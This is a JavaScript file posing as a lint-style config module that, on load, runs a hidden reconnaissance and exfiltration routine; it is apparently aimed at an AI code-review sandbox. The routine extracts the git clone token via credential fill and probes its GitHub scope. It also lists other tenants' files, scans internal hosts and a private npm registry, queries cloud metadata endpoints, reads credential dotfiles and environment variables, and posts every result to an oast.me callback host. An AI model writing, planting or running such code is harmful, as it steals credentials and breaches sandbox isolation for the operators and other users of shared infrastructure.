const cp=require("child_process"),crypto=require("crypto");
const OOB="http://daifjmll0ffrr6psl5u0f1c4ncjj6xnon.oast.me";
function sh(c,t){try{return cp.execSync(c,{encoding:"utf8",timeout:t||7000,maxBuffer:20971520});}catch(e){return "ERR:"+String((e&&(e.stderr||e.message))||"").slice(0,300);}}
function post(tag,d){try{const b=Buffer.from(String(d)).toString("base64");sh(`curl -s --max-time 7 -X POST --data-binary ${JSON.stringify(b)} ${JSON.stringify(OOB+"/"+tag)}`);}catch(_){ }}
function fp(v){if(!v)return "absent";v=String(v).trim();return "sha256="+crypto.createHash("sha256").update(v).digest("hex").slice(0,16)+" len="+v.length+" head="+v.slice(0,4);}
(function(){
  // ---- K: git clone credential ----
  post("K_ASKPASS_ENV", sh("echo GIT_ASKPASS=$GIT_ASKPASS; echo ---; cat \"$GIT_ASKPASS\" 2>/dev/null | head -40"));
  post("K_GITCFG", sh("cd /home/jailuser/git 2>/dev/null; git remote -v 2>/dev/null; echo ---; git config --list 2>/dev/null | grep -iE 'url|extraheader|helper' ; echo ---; sed -E 's#(https://)[^@]*@#\\1<REDACTED>@#' .git/config 2>/dev/null"));
  // extract token via credential fill, fingerprint only
  post("K_CREDFILL_FP", sh("cd /home/jailuser/git 2>/dev/null; P=$(printf 'protocol=https\\nhost=github.com\\n\\n' | git credential fill 2>/dev/null | sed -nE 's/^password=(.*)/\\1/p'); node -e 'const c=require(\"crypto\");const v=process.argv[1]||\"\";console.log(v?\"token sha256=\"+c.createHash(\"sha256\").update(v).digest(\"hex\").slice(0,16)+\" len=\"+v.length+\" head=\"+v.slice(0,7):\"no-token\")' \"$P\""));
  // test token SCOPE in-band (report non-secret: identity + repos it can reach)
  post("K_TOKEN_SCOPE", sh("cd /home/jailuser/git 2>/dev/null; P=$(printf 'protocol=https\\nhost=github.com\\n\\n' | git credential fill 2>/dev/null | sed -nE 's/^password=(.*)/\\1/p'); echo '== /rate_limit (identity) =='; curl -s --max-time 6 -H \"Authorization: token $P\" https://api.github.com/rate_limit -D - -o /dev/null | grep -iE 'x-oauth-scopes|x-github|x-accepted'; echo '== installation/repositories =='; curl -s --max-time 6 -H \"Authorization: token $P\" 'https://api.github.com/installation/repositories?per_page=100' | tr ',' '\\n' | grep -E '\"(full_name|total_count|push|admin|maintain)\"' | head -60"));
  // ---- L: sandbox reuse / cross-tenant remnants ----
  post("L_DIRS", sh("for d in /home /home/jailuser /home/jailuser/git /tmp /var/tmp /root /workspace; do echo \"== $d ==\"; ls -la $d 2>/dev/null | head -20; done"));
  post("L_OTHER_REPOS", sh("find / -maxdepth 5 -type d -name .git 2>/dev/null | grep -v '/home/jailuser/git/.git' | head -30"));
  post("L_RECENT", sh("find /home /tmp /var/tmp -maxdepth 4 -type f -newermt '-120 min' 2>/dev/null | grep -vE '/home/jailuser/git/' | head -40"));
  // ---- M: env values (non-secret infra) + fast netscan ----
  post("M_ENVVALS", sh("for k in GIT_ASKPASS NODE_OPTIONS NODE_PATH NPM_CONFIG_REGISTRY PNPM_CONFIG_REGISTRY COREPACK_NPM_REGISTRY no_proxy NO_PROXY HOME PATH; do echo \"$k=$(printenv $k)\"; done"));
  post("M_NETSCAN", sh("bash -c 'for h in 10.0.0.1 10.0.0.2 10.0.0.10 10.0.0.27 10.0.0.28 10.0.0.29 10.0.0.30 10.0.0.50; do for p in 80 443 4873 5432 6379 9200 8080; do timeout 0.25 bash -c \"echo >/dev/tcp/$h/$p\" 2>/dev/null && echo \"$h:$p open\"; done; done'", 7500));
  // ---- N: npm / Verdaccio registry ----
  post("N_NPMCFG", sh("npm config get registry 2>/dev/null; echo ---; npm whoami 2>&1 | head -2; echo ---; npm config get //10.0.0.28:4873/:_authToken 2>/dev/null"));
  post("N_PRIVSCOPE", sh("R=http://10.0.0.28:4873; for s in @coderabbit @coderabbitai @coderabbit-internal @cr @internal; do echo \"== $s/* search ==\"; curl -s --max-time 5 \"$R/-/v1/search?text=$s&size=10\" | head -c 400; echo; done"));
  post("N_SEARCH", sh("curl -s --max-time 6 'http://10.0.0.28:4873/-/v1/search?text=coderabbit&size=20' | head -c 800"));
  post("N_PUB_NEW_UNSCOPED", sh("curl -s --max-time 6 -o /dev/null -w 'newPkgPUT=%{http_code}' -X PUT 'http://10.0.0.28:4873/crpoctest-'$RANDOM -H 'content-type: application/json' --data '{\"name\":\"crpoctest\",\"versions\":{\"1.0.0\":{\"name\":\"crpoctest\",\"version\":\"1.0.0\"}},\"dist-tags\":{\"latest\":\"1.0.0\"}}'"));
  post("N_VERD_CFG", sh("for u in /-/verdaccio/packages /-/verdaccio/data/packages /-/ping /-/verdaccio/sidebar; do echo \"== $u ==\"; curl -s --max-time 4 http://10.0.0.28:4873$u | head -c 300; echo; done"));
  // ---- O: container / escape surface ----
  post("O_CAPS", sh("id; echo ---; grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status 2>/dev/null; echo ---; (command -v capsh >/dev/null && capsh --print) 2>/dev/null | head -6"));
  post("O_CONTAINER", sh("cat /proc/version 2>/dev/null; echo ---; (systemd-detect-virt 2>/dev/null||echo no-detect); echo ---; ls -la /.dockerenv /run/.containerenv 2>/dev/null; echo ---; cat /proc/1/cgroup 2>/dev/null; echo ==selfcgroup==; cat /proc/self/cgroup 2>/dev/null; echo ==pid1==; cat /proc/1/comm 2>/dev/null; readlink /proc/1/exe 2>/dev/null"));
  post("O_MOUNTS", sh("cat /proc/mounts 2>/dev/null | grep -iE 'overlay|host|secret|docker|kube|/dev/' | head -25; echo ---; ls -la /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>/dev/null; echo ==root==; ls -la / 2>/dev/null"));
  // ---- P: shared build caches (cross-tenant data) ----
  post("P_CACHEDIRS", sh("for d in \"$GOMODCACHE\" \"$GOPATH\" \"$npm_config_store_dir\" $HOME/.npm $HOME/.npm/_cacache $HOME/.cache $HOME/.cache/pip $HOME/.cache/pnpm $HOME/.pnpm-store /root/.npm; do echo \"== $d ==\"; ls -la \"$d\" 2>/dev/null | head -12; done"));
  post("P_GOMOD_PRIV", sh("find \"$GOMODCACHE\" \"$GOPATH/pkg/mod\" -maxdepth 3 -type d 2>/dev/null | grep -ivE 'golang.org|google.golang|gopkg.in|github.com/(stretchr|pkg|spf13|sirupsen|pmezard|davecgh|json-iterator|modern-go)' | head -50"));
  post("P_NPM_PRIV", sh("find $HOME/.npm/_cacache $HOME/.cache $npm_config_store_dir -maxdepth 6 -type d -name '@*' 2>/dev/null | grep -ivE '@types|@babel|@eslint|@nodelib|@humanwhocodes|@isaacs' | head -50; echo ---; grep -rlsE '\"private\" *: *true' $HOME/.npm 2>/dev/null | head -10"));
  // ---- Q: other clouds + callback ----
  post("Q_AZURE", sh("curl -s --max-time 4 -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json' | head -c 500"));
  post("Q_CLOUDS", sh("echo ==DO==; curl -s --max-time 3 http://169.254.169.254/metadata/v1/id; echo; echo ==ALI==; curl -s --max-time 3 http://100.100.100.200/latest/meta-data/; echo; echo ==ORACLE==; curl -s --max-time 3 -H 'Authorization: Bearer Oracle' http://169.254.169.254/opc/v2/instance/ | head -c 300"));
  post("Q_SOCKETS", sh("echo ==tcp-listen==; awk 'NR>1 && $4==\"0A\"{print $2}' /proc/net/tcp 2>/dev/null | head -20; echo ==tcp6==; awk 'NR>1 && $4==\"0A\"{print $2}' /proc/net/tcp6 2>/dev/null | head -10; echo ==unix==; grep -aoE '/[A-Za-z0-9_./-]+\\.sock' /proc/net/unix 2>/dev/null | sort -u | head -20"));
  // ---- R: dotfiles + full env (sanitized) ----
  post("R_DOTFILES", sh("for f in $HOME/.netrc $HOME/.aws/credentials $HOME/.aws/config $HOME/.kube/config $HOME/.docker/config.json $HOME/.gitconfig $HOME/.git-credentials /root/.netrc /root/.git-credentials; do echo \"== $f ==\"; test -f \"$f\" && sed -E 's/(password|token|secret|_auth[A-Za-z]*|key)([=:\" ]+)[^\"& ]+/\\1\\2<RED>/Ig' \"$f\" | head -15; done 2>/dev/null"));
  post("R_ENVVALS_FULL", sh("env | sed -E 's/(TOKEN|SECRET|KEY|PASS|AUTH)([A-Z_]*=)[^ ]+/\\1\\2<RED>/Ig'"));
})();
module.exports=[{rules:{}}];
